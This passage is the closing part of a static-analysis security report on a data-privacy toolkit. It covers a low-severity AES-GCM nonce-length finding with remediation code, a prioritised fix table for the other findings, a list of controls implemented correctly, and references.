| **Severity** | 🔵 LOW |
| **CWE** | CWE-330: Use of Insufficiently Random Values |
| **CVSS v3.1 Score** | 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| **File** | [`backend/algorithms/aes_cipher.py`](file:///d:/data-privacy-toolkit/backend/algorithms/aes_cipher.py) |
| **Lines** | 59–60, 88–96 |

#### Vulnerable Code

```python
# backend/algorithms/aes_cipher.py — Lines 59–60, 88–96
# In encrypt_gcm — nonce is generated by PyCryptodome
cipher = AES.new(validated_key, AES.MODE_GCM)  # PyCryptodome default nonce is 16 bytes

# In decrypt_gcm — comment acknowledges the ambiguity
# GCM default nonce is 16 bytes in some libs, but 12 is recommended for NIST
# ...
nonce_len = 16  # Hardcoded to 16, not the NIST-recommended 12
```

#### Description

NIST SP 800-38D (the defining standard for AES-GCM) specifies that a 12-byte (96-bit) nonce is the recommended length. Using a 16-byte nonce is technically valid but:

- The code comments acknowledge this discrepancy (`"12 is recommended for NIST"`) without addressing it.
- The assumption `nonce_len = 16` in `decrypt_gcm` is fragile — if `PyCryptodome`'s default nonce length changes across library versions, decryption will silently break.
- Hardcoding the value rather than reading `cipher.nonce_size` or parameterizing it introduces a maintenance risk.

#### Remediation

```python
# backend/algorithms/aes_cipher.py — Secure implementation
NONCE_LEN = 12  # NIST SP 800-38D recommended 96-bit nonce

def encrypt_gcm(self, plaintext: str, key: str | bytes) -> str:
    validated_key = self.validate_key(key)
    # Explicitly specify the 12-byte nonce length
    cipher = AES.new(validated_key, AES.MODE_GCM, nonce=get_random_bytes(NONCE_LEN))
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode("utf-8"))
    payload = cipher.nonce + tag + ciphertext  # nonce is always 12 bytes
    return base64.b64encode(payload).decode("utf-8")

def decrypt_gcm(self, ciphertext: str, key: str | bytes) -> str:
    validated_key = self.validate_key(key)
    try:
        data = base64.b64decode(ciphertext)
    except Exception:
        raise ValueError("Invalid Base64 encoding")

    # Use the constant, not a magic number
    if len(data) < NONCE_LEN + 16:
        raise ValueError("Ciphertext payload too short")

    nonce = data[:NONCE_LEN]          # 12 bytes
    tag   = data[NONCE_LEN:NONCE_LEN + 16]   # 16 bytes
    encrypted_data = data[NONCE_LEN + 16:]
    # ... rest of decryption
```

---

## Remediation Priority Matrix

| Priority | ID | Vulnerability | Effort | Impact |
| :---: | :--- | :--- | :---: | :---: |
| 1 | SAST-02 | Replace `eval()` in CLI | 🟢 Low | 🔴 Critical |
| 2 | SAST-01 | Enforce algorithm allowlist / use CipherFactory | 🟢 Low | 🔴 Critical |
| 3 | SAST-03 | Restrict CORS origins; add API key auth | 🟡 Medium | 🔴 Critical |
| 4 | SAST-04 | Remove hardcoded vault password; use env var | 🟢 Low | 🟠 High |
| 5 | SAST-05 | Add file size limits + MIME validation | 🟡 Medium | 🟠 High |
| 6 | SAST-06 | Replace textbook RSA with OAEP-padded RSA | 🟡 Medium | 🟠 High |
| 7 | SAST-09 | Add SlowAPI rate limiting | 🟢 Low | 🟡 Medium |
| 8 | SAST-07 | Replace custom ECC with `cryptography` library | 🟠 High | 🟡 Medium |
| 9 | SAST-08 | Replace `alert()` with sandboxed modal | 🟢 Low | 🟡 Medium |
| 10 | SAST-10 | Add structured security logging | 🟡 Medium | 🔵 Low |
| 11 | SAST-11 | Dynamic API base URL | 🟢 Low | 🔵 Low |
| 12 | SAST-12 | Remove phantom session token | 🟢 Low | 🔵 Low |
| 13 | SAST-13 | Standardize GCM nonce to 12 bytes | 🟢 Low | 🔵 Low |

---

## Appendix A: Positive Security Controls

The following security practices were identified as correctly implemented and should be preserved:

| Control | Location | Notes |
| :--- | :--- | :--- |
| AES-GCM Authenticated Encryption | `aes_cipher.py` | Uses encrypt-and-digest; verifies MAC on decryption |
| Constant-time comparison | `hmac_auth.py`, `password_hasher.py` | `secrets.compare_digest` prevents timing attacks |
| Scrypt KDF | `password_hasher.py`, `key_vault.py` | N=16384 provides adequate memory hardness |
| PBKDF2 with 100k iterations | `password_hasher.py` | Meets NIST minimum iteration recommendations |
| Pydantic input schema validation | `app.py` | Enforces request field types via FastAPI |
| Action enum enforcement | `app.py` L56–57 | Blocks action values outside encrypt/decrypt |
| In-memory binary processing | All media endpoints | Prevents disk-based forensic artifacts |
| RFC 3526 2048-bit DH prime | `diffie_hellman.py` | Uses standard safe prime group |

---

## Appendix B: References

| Reference | Link |
| :--- | :--- |
| OWASP Top 10 2021 | https://owasp.org/www-project-top-ten/ |
| CWE-94 Code Injection | https://cwe.mitre.org/data/definitions/94.html |
| CWE-259 Hardcoded Password | https://cwe.mitre.org/data/definitions/259.html |
| CWE-400 Resource Exhaustion | https://cwe.mitre.org/data/definitions/400.html |
| NIST SP 800-38D (AES-GCM) | https://csrc.nist.gov/publications/detail/sp/800-38d/final |
| RFC 6979 Deterministic ECDSA | https://www.rfc-editor.org/rfc/rfc6979 |
| PKCS#1 OAEP Padding Standard | https://www.rfc-editor.org/rfc/rfc8017 |
| SlowAPI Rate Limiting (FastAPI) | https://slowapi.readthedocs.io/ |
| Python-magic MIME Detection | https://pypi.org/project/python-magic/ |

---

*End of SAST Report — Data Privacy & Forensics Toolkit (DPFT)*
